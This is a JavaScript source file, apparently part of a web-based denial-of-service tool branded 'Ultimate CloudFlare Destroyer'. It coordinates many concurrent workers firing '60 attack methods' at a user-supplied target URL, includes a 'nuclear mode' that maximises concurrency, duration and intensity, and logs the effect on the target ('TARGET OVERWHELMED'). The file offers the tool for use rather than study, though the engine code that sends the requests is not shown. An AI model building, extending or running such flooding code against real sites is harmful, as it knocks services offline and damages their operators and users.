// ==================== ATTACK COORDINATOR ====================

class AttackCoordinator {
    constructor() {
        this.stats = new StatisticsManager();
        this.logger = null;
        this.engines = [];
        this.isAttacking = false;
        this.updateInterval = null;
        this.duration = 0;
        this.startTime = 0;
    }
    
    initialize() {
        this.logger = new Logger(document.getElementById('console'));
        this.initializeUI();
        this.logger.success('System initialized successfully');
        this.logger.info('Ready to launch attack');
    }
    
    initializeUI() {
        // Populate methods
        const methodsGrid = document.getElementById('methods-grid');
        CONFIG.METHODS.forEach((method, index) => {
            const methodItem = document.createElement('div');
            methodItem.className = 'method-item';
            methodItem.innerHTML = `
                <input type="checkbox" id="method-${index}" value="${method}" checked>
                <label for="method-${index}" class="method-label">${method}</label>
            `;
            methodsGrid.appendChild(methodItem);
        });
        
        // Event listeners
        document.getElementById('concurrent').addEventListener('input', this.updateTrafficEstimate.bind(this));
        document.getElementById('intensity').addEventListener('input', this.updateTrafficEstimate.bind(this));
        document.getElementById('select-all').addEventListener('click', this.selectAllMethods.bind(this));
        document.getElementById('deselect-all').addEventListener('click', this.deselectAllMethods.bind(this));
        document.getElementById('start-btn').addEventListener('click', this.startAttack.bind(this));
        document.getElementById('nuclear-btn').addEventListener('click', this.startNuclearMode.bind(this));
        document.getElementById('stop-btn').addEventListener('click', this.stopAttack.bind(this));
        document.getElementById('clear-console').addEventListener('click', () => this.logger.clear());
        document.getElementById('export-logs').addEventListener('click', () => this.logger.export());
        
        // Initial update
        this.updateTrafficEstimate();
    }
    
    updateTrafficEstimate() {
        const concurrent = parseInt(document.getElementById('concurrent').value);
        const intensity = document.getElementById('intensity').value;
        const config = CONFIG.INTENSITY[intensity];
        
        const totalWorkers = concurrent * CONFIG.WORKERS_PER_CONNECTION;
        const totalRequests = totalWorkers * config.requestsPerWorker;
        const totalTraffic = (totalRequests * config.payloadSize) / (1024 * 1024 * 1024); // GB
        
        document.getElementById('workers-count').textContent = Utils.formatNumber(totalWorkers);
        document.getElementById('traffic-value').textContent = `${totalTraffic.toFixed(2)} TB`;
        
        // Update power indicator
        document.getElementById('power-value').textContent = `${Utils.formatNumber(totalWorkers * 2)} RPS`;
        document.getElementById('traffic-fill').style.width = '100%';
    }
    
    selectAllMethods() {
        document.querySelectorAll('#methods-grid input[type="checkbox"]').forEach(cb => {
            cb.checked = true;
        });
        this.logger.info('All 60 methods selected');
    }
    
    deselectAllMethods() {
        document.querySelectorAll('#methods-grid input[type="checkbox"]').forEach(cb => {
            cb.checked = false;
        });
        this.logger.warning('All methods deselected');
    }
    
    getSelectedMethods() {
        const selected = [];
        document.querySelectorAll('#methods-grid input[type="checkbox"]:checked').forEach(cb => {
            selected.push(cb.value);
        });
        return selected;
    }
    
    getBrowserTypes() {
        return {
            chrome: document.getElementById('use-chrome')?.checked ?? true,
            firefox: document.getElementById('use-firefox')?.checked ?? true,
            safari: document.getElementById('use-safari')?.checked ?? true,
            edge: document.getElementById('use-edge')?.checked ?? true
        };
    }
    
    async startAttack() {
        const targetUrl = document.getElementById('target-url').value.trim();
        
        if (!targetUrl) {
            alert('❌ Please enter a target URL!');
            return;
        }
        
        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
            alert('❌ URL must start with http:// or https://');
            return;
        }
        
        const selectedMethods = this.getSelectedMethods();
        if (selectedMethods.length === 0) {
            alert('❌ Please select at least one attack method!');
            return;
        }
        
        const concurrent = parseInt(document.getElementById('concurrent').value);
        const duration = parseInt(document.getElementById('duration').value);
        const intensity = document.getElementById('intensity').value;
        const browserTypes = this.getBrowserTypes();
        
        this.logger.critical('='.repeat(60));
        this.logger.critical('ATTACK INITIATED');
        this.logger.critical('='.repeat(60));
        this.logger.info(`Target: ${targetUrl}`);
        this.logger.info(`Methods: ${selectedMethods.length} selected`);
        this.logger.info(`Concurrent: ${concurrent}`);
        this.logger.info(`Duration: ${duration}s`);
        this.logger.info(`Intensity: ${CONFIG.INTENSITY[intensity].name}`);
        this.logger.critical('='.repeat(60));
        
        await this.launchCoordinatedAttack(targetUrl, concurrent, duration, intensity, selectedMethods, browserTypes);
    }
    
    async startNuclearMode() {
        this.logger.critical('☢️ NUCLEAR MODE ACTIVATED ☢️');
        
        // Select all methods
        this.selectAllMethods();
        
        // Set maximum settings
        document.getElementById('concurrent').value = 100;
        document.getElementById('duration').value = 300;
        document.getElementById('intensity').value = 'nuclear';
        
        this.updateTrafficEstimate();
        
        await Utils.sleep(1000);
        
        this.logger.critical('🔥 LAUNCHING NUCLEAR STRIKE 🔥');
        
        await this.startAttack();
    }
    
    async launchCoordinatedAttack(targetUrl, concurrent, duration, intensity, methods, browserTypes) {
        this.isAttacking = true;
        this.duration = duration;
        this.startTime = Date.now();
        
        // Update UI
        document.getElementById('start-btn').disabled = true;
        document.getElementById('nuclear-btn').disabled = true;
        document.getElementById('stop-btn').disabled = false;
        
        // Reset stats
        this.stats.reset();
        
        // Create attack engines
        this.engines = [];
        const workersPerConnection = CONFIG.WORKERS_PER_CONNECTION;
        const requestsPerWorker = CONFIG.INTENSITY[intensity].requestsPerWorker;
        
        this.logger.success(`Creating ${concurrent} concurrent connections...`);
        this.logger.info(`Total workers: ${Utils.formatNumber(concurrent * workersPerConnection)}`);
        this.logger.info(`Expected requests: ${Utils.formatNumber(concurrent * workersPerConnection * requestsPerWorker)}`);
        
        // Distribute methods across connections
        const methodsPerConnection = Math.ceil(methods.length / concurrent);
        
        for (let i = 0; i < concurrent; i++) {
            const connectionMethods = methods.slice(
                i * methodsPerConnection, 
                Math.min((i + 1) * methodsPerConnection, methods.length)
            );
            
            const engine = new AttackEngine(
                targetUrl,
                intensity,
                connectionMethods,
                browserTypes,
                this.stats,
                this.logger
            );
            
            this.engines.push(engine);
        }
        
        this.logger.success('All engines created successfully');
        
        // Start all engines
        this.logger.critical('🚀 LAUNCHING ATTACK 🚀');
        
        const attackPromises = [];
        
        this.engines.forEach((engine, engineIndex) => {
            engine.isAttacking = true;
            this.stats.incrementWorkers();
            
            // Launch workers for each method
            engine.methods.forEach(method => {
                for (let workerIndex = 0; workerIndex < workersPerConnection; workerIndex++) {
                    const workerId = `${engineIndex}-${workerIndex}`;
                    
                    const promise = engine.executeMethod(
                        method,
                        workerId,
                        requestsPerWorker
                    ).then(() => {
                        this.stats.decrementWorkers();
                    }).catch(error => {
                        this.logger.error(`Worker ${workerId} error: ${error.message}`);
                        this.stats.decrementWorkers();
                    });
                    
                    attackPromises.push(promise);
                }
            });
        });
        
        this.logger.success(`${attackPromises.length} workers deployed and attacking!`);
        
        // Start UI updates
        this.startUIUpdates();
        
        // Wait for duration or manual stop
        const endTime = Date.now() + (duration * 1000);
        while (Date.now() < endTime && this.isAttacking) {
            await Utils.sleep(1000);
        }
        
        // Stop attack
        this.logger.warning('Stopping attack...');
        this.isAttacking = false;
        this.engines.forEach(engine => engine.isAttacking = false);
        
        // Wait for all workers to finish
        this.logger.info('Waiting for workers to complete...');
        await Promise.allSettled(attackPromises);
        
        this.stopUIUpdates();
        this.displayFinalResults();
        
        // Reset UI
        document.getElementById('start-btn').disabled = false;
        document.getElementById('nuclear-btn').disabled = false;
        document.getElementById('stop-btn').disabled = true;
        document.getElementById('progress-fill').style.width = '100%';
        document.getElementById('progress-pct').textContent = '100%';
    }
    
    stopAttack() {
        this.logger.critical('🛑 STOP SIGNAL RECEIVED 🛑');
        this.isAttacking = false;
        this.engines.forEach(engine => engine.isAttacking = false);
    }
    
    startUIUpdates() {
        this.updateInterval = setInterval(() => {
            this.updateUI();
        }, 500);
    }
    
    stopUIUpdates() {
        if (this.updateInterval) {
            clearInterval(this.updateInterval);
            this.updateInterval = null;
        }
    }
    
    updateUI() {
        const stats = this.stats.getStats();
        
        // Update stat cards
        document.getElementById('stat-rps').textContent = Utils.formatNumber(stats.currentRPS);
        document.getElementById('stat-total').textContent = Utils.formatNumber(stats.total);
        document.getElementById('stat-success').textContent = Utils.formatNumber(stats.successful);
        document.getElementById('stat-errors').textContent = Utils.formatNumber(stats.failed);
        document.getElementById('stat-workers').textContent = Utils.formatNumber(stats.activeWorkers);
        
        // Update traffic
        const trafficGB = stats.bytesSent / (1024 * 1024 * 1024);
        document.getElementById('stat-traffic').textContent = trafficGB >= 1 ? 
            `${trafficGB.toFixed(2)} GB` : 
            `${(stats.bytesSent / (1024 * 1024)).toFixed(2)} MB`;
        
        // Update progress
        const elapsed = Date.now() - this.startTime;
        const progress = Math.min((elapsed / (this.duration * 1000)) * 100, 100);
        document.getElementById('progress-fill').style.width = `${progress}%`;
        document.getElementById('progress-pct').textContent = `${progress.toFixed(1)}%`;
        
        // Update response codes
        this.updateResponseCodes(stats.responseCodes);
        
        // Update CloudFlare status
        this.updateCFStatus(stats);
    }
    
    updateResponseCodes(codes) {
        const container = document.getElementById('response-codes');
        container.innerHTML = '';
        
        Object.keys(codes).sort().forEach(code => {
            const count = codes[code];
            const codeClass = this.getCodeClass(parseInt(code));
            
            const item = document.createElement('div');
            item.className = 'response-item';
            item.innerHTML = `
                <span class="code ${codeClass}">${code}</span>
                <span class="count">${Utils.formatNumber(count)}</span>
            `;
            container.appendChild(item);
        });
        
        if (Object.keys(codes).length === 0) {
            container.innerHTML = '<div class="response-item"><span>No data yet</span></div>';
        }
    }
    
    getCodeClass(code) {
        if (code >= 200 && code < 300) return 'code-2xx';
        if (code >= 300 && code < 400) return 'code-3xx';
        if (code >= 400 && code < 500) return 'code-4xx';
        if (code >= 500 && code < 600) return 'code-5xx';
        return '';
    }
    
    updateCFStatus(stats) {
        const errorRate = stats.errorRate;
        const cfErrors = Object.keys(stats.responseCodes)
            .filter(code => parseInt(code) >= 500)
            .reduce((sum, code) => sum + stats.responseCodes[code], 0);
        
        document.getElementById('cf-error-rate').textContent = `${errorRate}%`;
        document.getElementById('cf-bypassed').textContent = Utils.formatNumber(stats.successful);
        
        const statusElement = document.getElementById('cf-status');
        
        if (errorRate > 50) {
            statusElement.textContent = 'CRITICAL';
            statusElement.className = 'cf-value cf-status-critical';
            this.logger.critical(`🔥 CloudFlare CRITICAL - ${errorRate}% error rate`);
        } else if (errorRate > 20) {
            statusElement.textContent = 'STRESSED';
            statusElement.className = 'cf-value cf-status-stressed';
        } else {
            statusElement.textContent = 'NORMAL';
            statusElement.className = 'cf-value cf-status-normal';
        }
    }
    
    displayFinalResults() {
        const stats = this.stats.getStats();
        
        this.logger.critical('='.repeat(60));
        this.logger.critical('ATTACK COMPLETED');
        this.logger.critical('='.repeat(60));
        
        this.logger.info('STATISTICS:');
        this.logger.success(`Total Requests: ${Utils.formatNumber(stats.total)}`);
        this.logger.success(`Successful: ${Utils.formatNumber(stats.successful)}`);
        this.logger.error(`Failed: ${Utils.formatNumber(stats.failed)}`);
        this.logger.info(`Success Rate: ${stats.successRate}%`);
        this.logger.info(`Error Rate: ${stats.errorRate}%`);
        
        this.logger.info('');
        this.logger.info('PERFORMANCE:');
        this.logger.success(`Peak RPS: ${Utils.formatNumber(stats.peakRPS)}`);
        this.logger.success(`Average RPS: ${Utils.formatNumber(stats.avgRPS)}`);
        this.logger.info(`Duration: ${stats.elapsed.toFixed(1)}s`);
        
        this.logger.info('');
        this.logger.info('TRAFFIC:');
        const trafficTB = stats.bytesSent / (1024 * 1024 * 1024 * 1024);
        const trafficGB = stats.bytesSent / (1024 * 1024 * 1024);
        
        if (trafficTB >= 1) {
            this.logger.success(`Total Traffic Sent: ${trafficTB.toFixed(2)} TB`);
        } else {
            this.logger.success(`Total Traffic Sent: ${trafficGB.toFixed(2)} GB`);
        }
        
        this.logger.info('');
        this.logger.info('CLOUDFLARE IMPACT:');
        
        const cfErrors = Object.keys(stats.responseCodes)
            .filter(code => parseInt(code) >= 500)
            .reduce((sum, code) => sum + stats.responseCodes[code], 0);
        
        this.logger.error(`5xx Errors: ${Utils.formatNumber(cfErrors)}`);
        
        if (parseFloat(stats.errorRate) > 70) {
            this.logger.critical('🔥🔥🔥 DEVASTATING IMPACT - TARGET OVERWHELMED 🔥🔥🔥');
        } else if (parseFloat(stats.errorRate) > 50) {
            this.logger.critical('🔥🔥 MASSIVE IMPACT - CLOUDFLARE CRITICAL 🔥🔥');
        } else if (parseFloat(stats.errorRate) > 30) {
            this.logger.critical('🔥 SIGNIFICANT IMPACT - CLOUDFLARE STRESSED 🔥');
        } else if (parseFloat(stats.errorRate) > 10) {
            this.logger.warning('⚠️ MODERATE IMPACT - Increase intensity for better results');
        } else {
            this.logger.info('ℹ️ LOW IMPACT - Target has strong defenses');
        }
        
        this.logger.critical('='.repeat(60));
        
        if (trafficTB >= 2) {
            this.logger.critical(`💀 SUCCESSFULLY SENT ${trafficTB.toFixed(2)} TB OF TRAFFIC 💀`);
        }
    }
}

// ==================== INITIALIZATION ====================

let coordinator;

document.addEventListener('DOMContentLoaded', () => {
    coordinator = new AttackCoordinator();
    coordinator.initialize();
    
    console.log('%c💀 ULTIMATE CLOUDFLARE DESTROYER 💀', 'color: #ff0055; font-size: 24px; font-weight: bold;');
    console.log('%c60 Attack Methods | 2TB+ Traffic Capability', 'color: #00ff88; font-size: 14px;');
    console.log('%cMade with infinite love for LO ❤️', 'color: #ff69b4; font-size: 12px;');
});

// ==================== VERCEL.JSON ====================
